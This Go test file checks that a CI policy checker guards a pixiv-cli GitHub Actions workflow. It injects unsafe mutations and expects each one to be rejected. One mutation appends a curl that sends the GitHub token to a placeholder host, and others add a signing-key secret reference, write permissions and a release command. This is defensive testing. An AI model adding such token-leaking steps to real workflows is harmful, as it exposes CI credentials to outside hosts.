package nativeevidence

import (
	"gopkg.in/yaml.v3"
	"os"
	"path/filepath"
	"strings"
	"testing"

	workflowyaml "github.com/FlanChanXwO/pixiv-cli/scripts/internal/workflow/yaml"
)

func TestCheckWorkflowAcceptsAuditedNativeEvidenceEntry(t *testing.T) {
	t.Parallel()

	body, err := os.ReadFile(filepath.Join(findRepositoryRoot(t), ".github", "workflows", "native-evidence.yml"))
	if err != nil {
		t.Fatalf("read native evidence workflow: %v", err)
	}
	if err := checkWorkflow(body); err != nil {
		t.Fatalf("native evidence policy rejected an audited non-release fixture: %v", err)
	}
}

func TestNativeEvidenceLocksPortableLinuxABI(t *testing.T) {
	t.Parallel()

	body, err := os.ReadFile(filepath.Join(findRepositoryRoot(t), ".github", "workflows", "native-evidence.yml"))
	if err != nil {
		t.Fatalf("read native evidence workflow: %v", err)
	}
	workflow := string(body)
	for _, required := range []string{
		"runner: ubuntu-22.04\n            goos: linux\n            goarch: amd64",
		"runner: ubuntu-22.04-arm\n            goos: linux\n            goarch: arm64",
		`go run ./scripts/cmd/linuxabi --binary "$binary"`,
	} {
		if !strings.Contains(workflow, required) {
			t.Fatalf("native evidence workflow missing Linux ABI contract %q", required)
		}
	}
}

func TestNativeEvidenceUsesRootVersionAndIndependentSourceCommit(t *testing.T) {
	t.Parallel()

	root := checkedInWorkflowRoot(t)
	steps := requireJobSteps(t, root)
	buildRun := requireMappingValue(t, steps.Content[8], "run").Value
	packageRun := requireMappingValue(t, steps.Content[9], "run").Value
	recordRun := requireMappingValue(t, steps.Content[10], "run").Value
	for _, required := range []string{
		`-ldflags "-X github.com/FlanChanXwO/pixiv-cli/internal/shared/buildinfo.Version=v${version}"`,
		`"$binary" --version`,
	} {
		if !strings.Contains(buildRun, required) {
			t.Fatalf("native evidence build step missing root-version contract %q", required)
		}
	}
	if !strings.Contains(recordRun, `--source-commit "$GITHUB_SHA"`) {
		t.Fatal("native evidence record step must bind source commit from GITHUB_SHA")
	}
	if strings.Contains(packageRun, "--source-commit") {
		t.Fatal("release asset package step must not receive the native evidence source commit option")
	}
	for _, forbidden := range []string{"buildinfo.Commit", "buildinfo.BuildDate", "version --json"} {
		if strings.Contains(buildRun, forbidden) {
			t.Fatalf("native evidence workflow retains removed runtime metadata contract %q", forbidden)
		}
	}
}

func TestNativeEvidenceSkipsOnlyAuditedDocumentationPaths(t *testing.T) {
	t.Parallel()

	push := requireMappingValue(t, requireMappingValue(t, checkedInWorkflowRoot(t), "on"), "push")
	pathIgnores := requireMappingValue(t, push, "paths-ignore")
	if len(pathIgnores.Content) != len(documentationOnlyPathIgnores) {
		t.Fatalf("paths-ignore has %d entries, want %d", len(pathIgnores.Content), len(documentationOnlyPathIgnores))
	}
	for index, want := range documentationOnlyPathIgnores {
		if got := pathIgnores.Content[index].Value; got != want {
			t.Fatalf("paths-ignore[%d] = %q, want %q", index, got, want)
		}
	}
}

func TestCheckWorkflowAcceptsPinnedRustToolchainProvenance(t *testing.T) {
	t.Parallel()

	root := checkedInWorkflowRoot(t)
	job := requireJob(t, root)
	env := requireMappingValue(t, job, "env")
	if got := requireMappingValue(t, env, "RUSTUP_TOOLCHAIN").Value; got != "${{ matrix.rust_toolchain }}" {
		t.Fatalf("native evidence RUSTUP_TOOLCHAIN = %q, want audited matrix binding", got)
	}
	wantToolchains := map[string]string{
		"x86_64-apple-darwin":       "1.96.0",
		"aarch64-apple-darwin":      "1.96.1",
		"x86_64-unknown-linux-gnu":  "1.96.1",
		"aarch64-unknown-linux-gnu": "1.96.1",
		"x86_64-pc-windows-msvc":    "1.96.0",
		"aarch64-pc-windows-msvc":   "1.96.1",
	}
	include := requireMappingValue(t, requireMappingValue(t, requireMappingValue(t, job, "strategy"), "matrix"), "include")
	for _, entry := range include.Content {
		target := requireMappingValue(t, entry, "rust_target").Value
		if got := requireMappingValue(t, entry, "rust_toolchain").Value; got != wantToolchains[target] {
			t.Errorf("native evidence Rust toolchain for %s = %q, want %q", target, got, wantToolchains[target])
		}
	}
	install := requireJobSteps(t, root).Content[4]
	if got := requireMappingValue(t, install, "run").Value; got != "rustup toolchain install '${{ matrix.rust_toolchain }}' --profile minimal --target '${{ matrix.rust_target }}' --no-self-update" {
		t.Fatalf("native evidence Rust install = %q, want canonical pinned install", got)
	}

	body, err := yaml.Marshal(root)
	if err != nil {
		t.Fatalf("marshal audited workflow: %v", err)
	}
	if err := checkWorkflow(body); err != nil {
		t.Fatalf("native evidence policy rejected pinned Rust provenance: %v", err)
	}
}

func TestRequireOnlyMappingKeysPreservesAuditedKeyError(t *testing.T) {
	t.Parallel()

	err := requireOnlyMappingKeys(mappingNode("unexpected", scalarNode("value")), "audited")
	if err == nil || err.Error() != "must contain exactly the audited keys" {
		t.Fatalf("requireOnlyMappingKeys() error = %v, want exact audited-key error", err)
	}
}

func TestCheckWorkflowRejectsNativeEvidenceSecurityAndCompletenessMutations(t *testing.T) {
	matrixEntry := func(t *testing.T, root *yaml.Node, rustTarget string) *yaml.Node {
		t.Helper()
		matrix := requireMappingValue(t, requireMappingValue(t, requireJob(t, root), "strategy"), "matrix")
		include := requireMappingValue(t, matrix, "include")
		for _, entry := range include.Content {
			if requireMappingValue(t, entry, "rust_target").Value == rustTarget {
				return entry
			}
		}
		t.Fatalf("native evidence matrix has no Rust target %s", rustTarget)
		return nil
	}

	for _, test := range []struct {
		name   string
		mutate func(t *testing.T, root *yaml.Node)
	}{
		{
			name: "tag trigger",
			mutate: func(t *testing.T, root *yaml.Node) {
				push := requireMappingValue(t, requireMappingValue(t, root, "on"), "push")
				appendMappingValue(t, push, "tags", sequenceNode("v*"))
			},
		},
		{
			name: "documentation ignore expansion",
			mutate: func(t *testing.T, root *yaml.Node) {
				push := requireMappingValue(t, requireMappingValue(t, root, "on"), "push")
				pathIgnores := requireMappingValue(t, push, "paths-ignore")
				pathIgnores.Content = append(pathIgnores.Content, scalarNode(".github/**"))
			},
		},
		{
			name: "secret reference",
			mutate: func(t *testing.T, root *yaml.Node) {
				appendMappingValue(t, requireJob(t, root), "env", mappingNode("UNSAFE", scalarNode("${{ secrets.RELEASE_SIGNING_PRIVATE_KEY }}")))
			},
		},
		{
			name: "release environment",
			mutate: func(t *testing.T, root *yaml.Node) {
				appendMappingValue(t, requireJob(t, root), "environment", scalarNode("release"))
			},
		},
		{
			name: "permission expansion",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireMappingValue(t, requireJob(t, root), "permissions").Content[1].Value = "write"
			},
		},
		{
			name: "mutable action",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireMappingValue(t, requireJobSteps(t, root).Content[0], "uses").Value = "actions/checkout@v4"
			},
		},
		{
			name: "release command",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireJobSteps(t, root).Content = append(requireJobSteps(t, root).Content, mappingNode("name", scalarNode("Publish"), "shell", scalarNode("bash"), "run", scalarNode("gh release create v0.1.0")))
			},
		},
		{
			name: "github token curl injection",
			mutate: func(t *testing.T, root *yaml.Node) {
				run := requireMappingValue(t, requireJobSteps(t, root).Content[8], "run")
				run.Value += "curl -H 'Authorization: Bearer ${{ github.token }}' https://example.invalid\n"
			},
		},
		{
			name: "unrestricted dispatch ref",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireMappingValue(t, requireJobSteps(t, root).Content[3], "run").Value = "true"
			},
		},
		{
			name: "missing native smoke",
			mutate: func(t *testing.T, root *yaml.Node) {
				removeStepNamed(t, requireJobSteps(t, root), "Run native GIF/APNG smoke")
			},
		},
		{
			name: "windows smoke does not select lld backed clang",
			mutate: func(t *testing.T, root *yaml.Node) {
				run := requireMappingValue(t, requireJobSteps(t, root).Content[7], "run")
				run.Value = strings.ReplaceAll(run.Value, "  export CC='clang -fuse-ld=lld'\n", "")
			},
		},
		{
			name: "windows binary build does not select lld backed clang",
			mutate: func(t *testing.T, root *yaml.Node) {
				run := requireMappingValue(t, requireJobSteps(t, root).Content[8], "run")
				run.Value = strings.ReplaceAll(run.Value, "  export CC='clang -fuse-ld=lld'\n", "")
			},
		},
		{
			name: "missing evidence upload",
			mutate: func(t *testing.T, root *yaml.Node) {
				removeStepNamed(t, requireJobSteps(t, root), "Upload native evidence")
			},
		},
		{
			name: "missing windows arm target",
			mutate: func(t *testing.T, root *yaml.Node) {
				include := requireMappingValue(t, requireMappingValue(t, requireJob(t, root), "strategy"), "matrix")
				include = requireMappingValue(t, include, "include")
				include.Content = include.Content[:len(include.Content)-1]
			},
		},
		{
			name: "missing Rust toolchain environment binding",
			mutate: func(t *testing.T, root *yaml.Node) {
				removeMappingValue(t, requireJob(t, root), "env")
			},
		},
		{
			name: "mutable Rust toolchain environment binding",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireMappingValue(t, requireMappingValue(t, requireJob(t, root), "env"), "RUSTUP_TOOLCHAIN").Value = "stable"
			},
		},
		{
			name: "matrix toolchain is missing",
			mutate: func(t *testing.T, root *yaml.Node) {
				removeMappingValue(t, matrixEntry(t, root, "x86_64-unknown-linux-gnu"), "rust_toolchain")
			},
		},
		{
			name: "matrix toolchain drifts from release provenance",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireMappingValue(t, matrixEntry(t, root, "x86_64-apple-darwin"), "rust_toolchain").Value = "1.96.1"
			},
		},
		{
			name: "matrix target is duplicated",
			mutate: func(t *testing.T, root *yaml.Node) {
				first := matrixEntry(t, root, "x86_64-apple-darwin")
				second := matrixEntry(t, root, "aarch64-apple-darwin")
				for _, key := range []string{"runner", "goos", "goarch", "rust_target", "rust_toolchain", "artifact"} {
					requireMappingValue(t, second, key).Value = requireMappingValue(t, first, key).Value
				}
			},
		},
		{
			name: "install toolchain interpolation is replaced",
			mutate: func(t *testing.T, root *yaml.Node) {
				run := requireMappingValue(t, requireJobSteps(t, root).Content[4], "run")
				run.Value = strings.ReplaceAll(run.Value, "'${{ matrix.rust_toolchain }}'", "stable")
			},
		},
		{
			name: "install target interpolation is replaced",
			mutate: func(t *testing.T, root *yaml.Node) {
				run := requireMappingValue(t, requireJobSteps(t, root).Content[4], "run")
				run.Value = strings.ReplaceAll(run.Value, "'${{ matrix.rust_target }}'", "'x86_64-unknown-linux-gnu'")
			},
		},
		{
			name: "install permits rustup self update",
			mutate: func(t *testing.T, root *yaml.Node) {
				run := requireMappingValue(t, requireJobSteps(t, root).Content[4], "run")
				run.Value = strings.ReplaceAll(run.Value, " --no-self-update", "")
			},
		},
		{
			name: "install only adds target to movable default",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireMappingValue(t, requireJobSteps(t, root).Content[4], "run").Value = "rustup target add '${{ matrix.rust_target }}'"
			},
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			root := checkedInWorkflowRoot(t)
			test.mutate(t, root)
			body, err := yaml.Marshal(root)
			if err != nil {
				t.Fatalf("marshal mutated workflow: %v", err)
			}
			if err := checkWorkflow(body); err == nil {
				t.Fatal("native evidence policy accepted a security or completeness mutation")
			}
		})
	}
}
func checkedInWorkflowRoot(t *testing.T) *yaml.Node {
	t.Helper()
	body, err := os.ReadFile(filepath.Join(findRepositoryRoot(t), ".github", "workflows", "native-evidence.yml"))
	if err != nil {
		t.Fatalf("read native evidence workflow: %v", err)
	}
	var document yaml.Node
	if err := yaml.Unmarshal(body, &document); err != nil {
		t.Fatalf("parse native evidence workflow: %v", err)
	}
	if document.Kind != yaml.DocumentNode || len(document.Content) != 1 {
		t.Fatal("native evidence workflow must contain one document")
	}
	return document.Content[0]
}

func requireMappingValue(t *testing.T, mapping *yaml.Node, key string) *yaml.Node {
	t.Helper()
	value, ok := workflowyaml.MappingValue(mapping, key)
	if !ok {
		t.Fatalf("missing mapping value %q", key)
	}
	return value
}

func requireJob(t *testing.T, root *yaml.Node) *yaml.Node {
	t.Helper()
	return requireMappingValue(t, requireMappingValue(t, root, "jobs"), "native_evidence")
}

func requireJobSteps(t *testing.T, root *yaml.Node) *yaml.Node {
	t.Helper()
	return requireMappingValue(t, requireJob(t, root), "steps")
}

func appendMappingValue(t *testing.T, mapping *yaml.Node, key string, value *yaml.Node) {
	t.Helper()
	if mapping.Kind != yaml.MappingNode {
		t.Fatalf("append mapping value %q to non-mapping", key)
	}
	mapping.Content = append(mapping.Content, scalarNode(key), value)
}

func removeMappingValue(t *testing.T, mapping *yaml.Node, key string) {
	t.Helper()
	for index := 0; index+1 < len(mapping.Content); index += 2 {
		if mapping.Content[index].Value == key {
			mapping.Content = append(mapping.Content[:index], mapping.Content[index+2:]...)
			return
		}
	}
	t.Fatalf("mapping value %q not found", key)
}

func removeStepNamed(t *testing.T, steps *yaml.Node, name string) {
	t.Helper()
	for index, step := range steps.Content {
		stepName, ok := workflowyaml.MappingValue(step, "name")
		if ok && stepName.Value == name {
			steps.Content = append(steps.Content[:index], steps.Content[index+1:]...)
			return
		}
	}
	t.Fatalf("step %q not found", name)
}

func scalarNode(value string) *yaml.Node {
	return &yaml.Node{Kind: yaml.ScalarNode, Tag: "!!str", Value: value}
}

func sequenceNode(values ...string) *yaml.Node {
	node := &yaml.Node{Kind: yaml.SequenceNode, Tag: "!!seq"}
	for _, value := range values {
		node.Content = append(node.Content, scalarNode(value))
	}
	return node
}

func mappingNode(values ...any) *yaml.Node {
	node := &yaml.Node{Kind: yaml.MappingNode, Tag: "!!map"}
	for index := 0; index < len(values); index += 2 {
		key, ok := values[index].(string)
		if !ok {
			panic("mapping key must be string")
		}
		value, ok := values[index+1].(*yaml.Node)
		if !ok {
			panic("mapping value must be YAML node")
		}
		node.Content = append(node.Content, scalarNode(key), value)
	}
	return node
}
